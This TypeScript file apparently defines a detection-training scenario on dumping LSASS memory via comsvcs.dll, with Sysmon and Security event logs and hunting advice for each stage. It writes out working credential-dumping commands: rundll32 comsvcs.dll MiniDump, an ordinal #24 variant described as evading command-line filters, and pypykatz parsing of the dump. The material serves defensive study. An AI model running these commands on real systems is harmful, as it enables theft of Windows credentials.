import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-lsass-minidump-comsvcs-sysmon-eid10',
    title: 'Microsoft Sysinternals & Splunk SURGe DFIR — LSASS MiniDump via comsvcs.dll & Sysmon EventID 10',
    category: 'MALWARE',
    mitreId: 'T1003.001',
    description:
      'Grounded in Microsoft Sysinternals Sysmon Event ID 10 documentation, Splunk SURGe credential dumping research, and MITRE ATT&CK T1003.001: an attacker dumps lsass.exe process memory using the signed Windows COM+ Services DLL (rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump), generating a characteristic GrantedAccess mask (0x1FFFFF or 0x1410) and CallTrace signature in Sysmon EventID 10 and Security EventID 4656.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Shell Session', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Win32 Process Manager (CSR)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'rundll32.exe (comsvcs.dll)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sysmon EID 10 & EID 11 Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'lsass.exe (PID 684 Memory)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: SeDebugPrivilege Enablement & LSASS PID Discovery (Security EventID 4703 / 4672)',
        narration:
          'Before opening a handle to the protected Local Security Authority Subsystem Service (lsass.exe, PID 684), the attacker enables SeDebugPrivilege in their access token via AdjustTokenPrivileges (logged under Windows Security EventID 4703) and queries tasklist /fi "imagename eq lsass.exe" to resolve the target PID.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Privilege Escalation (T1134 - Access Token Manipulation: SeDebugPrivilege)',
        technicalCommands: [
          'whoami /priv  # Verify SeDebugPrivilege is Enabled',
          'tasklist /svc /fi "imagename eq lsass.exe"  # Resolves lsass.exe PID 684',
          'AdjustTokenPrivileges(hToken, FALSE, SE_DEBUG_NAME) -> EventID 4703',
        ],
        defenseMitigation:
          'Enable Windows RunAsPPL (Protected Process Light) via HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL=1 and Windows Defender Credential Guard to block non-PPL userland handles to lsass.exe.',
        logs: [
          {
            id: 'dfir-lsass-1',
            timestamp: '11:14:02.110',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 4703,
            ProcessName: 'powershell.exe',
            CommandLine: 'powershell.exe -NoP -Command "Get-Process lsass | Select-Object Id"',
            raw: 'EventID: 4703 | Account Name: admin_ops | Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe | Enabled Privilege List: SeDebugPrivilege | Target Process: lsass.exe (PID 684)',
            parsedFields: {
              EventID: '4703 (Token Right Adjusted)',
              EnabledPrivilege: 'SeDebugPrivilege',
              TargetProcess: 'lsass.exe (PID 684)',
              ExecutingProcess: 'powershell.exe',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Cross-Process OpenProcess & MiniDumpWriteDump via comsvcs.dll (Sysmon EventID 10)',
        narration:
          'The attacker executes rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full. Internally, comsvcs.dll invokes OpenProcess(PROCESS_ALL_ACCESS 0x1FFFFF) on lsass.exe and calls dbghelp.dll!MiniDumpWriteDump, which Sysmon EventID 10 captures with CallTrace entries pointing directly through comsvcs.dll and dbgcore.dll.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - OS Credential Dumping: LSASS Memory)',
        technicalCommands: [
          'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full',
          'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,#24 684 C:\\Windows\\Temp\\debug.bin full  # Ordinal #24 bypasses naive CLI filters',
          'Sysmon EventID 10: TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF CallTrace=...comsvcs.dll+...dbgcore.dll',
        ],
        defenseMitigation:
          'Hunt on Sysmon EventID 10 where TargetImage ends with \\lsass.exe, GrantedAccess contains 0x1FFFFF, 0x1410, 0x1010, or 0x1438, and CallTrace includes comsvcs.dll, dbghelp.dll, or dbgcore.dll.',
        logs: [
          {
            id: 'dfir-lsass-2',
            timestamp: '11:14:05.490',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 10,
            ProcessName: 'rundll32.exe',
            CommandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full',
            raw: 'EventID: 10 | SourceImage: C:\\Windows\\System32\\rundll32.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1fffff | CallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|C:\\Windows\\System32\\comsvcs.dll+4218a|C:\\Windows\\SYSTEM32\\dbgcore.dll+8412',
            parsedFields: {
              EventID: '10 (Sysmon ProcessAccess) / 4656 (Security Object Handle)',
              SourceImage: 'C:\\Windows\\System32\\rundll32.exe',
              TargetImage: 'C:\\Windows\\System32\\lsass.exe',
              GrantedAccess: '0x1FFFFF (PROCESS_ALL_ACCESS)',
              CallTrace: 'ntdll.dll -> KERNELBASE.dll -> comsvcs.dll -> dbgcore.dll',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: MDMP Magic Header (4D 44 4D 50) File Creation & Offline Pypykatz Parsing (Sysmon EventID 11)',
        narration:
          'dbgcore.dll writes the complete LSASS virtual memory snapshot to C:\\Windows\\Temp\\debug.bin beginning with the 4-byte Windows Minidump signature 4D 44 4D 50 ("MDMP"). Sysmon EventID 11 logs the creation of the dump file by rundll32.exe before the attacker exfiltrates it to parse wdigest, msv1_0, and kerberos structures with pypykatz.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - Minidump File Artifact & Offline Parsing)',
        technicalCommands: [
          'Sysmon EventID 11: Image=C:\\Windows\\System32\\rundll32.exe TargetFilename=C:\\Windows\\Temp\\debug.bin',
          'File Header Magic: 4D 44 4D 50 93 A7 00 00 ("MDMP" Minidump Header)',
          'pypykatz lsa minidump debug.bin',
        ],
        defenseMitigation:
          'Deploy YARA/EDR file-write inspection for the 4D 44 4D 50 ("MDMP") magic header written by non-WER processes (such as rundll32.exe, taskmgr.exe, or powershell.exe).',
        logs: [
          {
            id: 'dfir-lsass-3',
            timestamp: '11:14:06.102',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 11,
            ProcessName: 'rundll32.exe',
            CommandLine: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 684 C:\\Windows\\Temp\\debug.bin full',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\rundll32.exe | TargetFilename: C:\\Windows\\Temp\\debug.bin | CreationUtcTime: 2026-11-03 11:14:06.102 | FileMagic: 4D444D50 (MDMP) | Size: 68419584 bytes',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate)',
              Image: 'C:\\Windows\\System32\\rundll32.exe',
              TargetFilename: 'C:\\Windows\\Temp\\debug.bin',
              FileHeaderSignature: '4D 44 4D 50 (MDMP Minidump)',
            },
          },
        ],
      },
    ],
  };
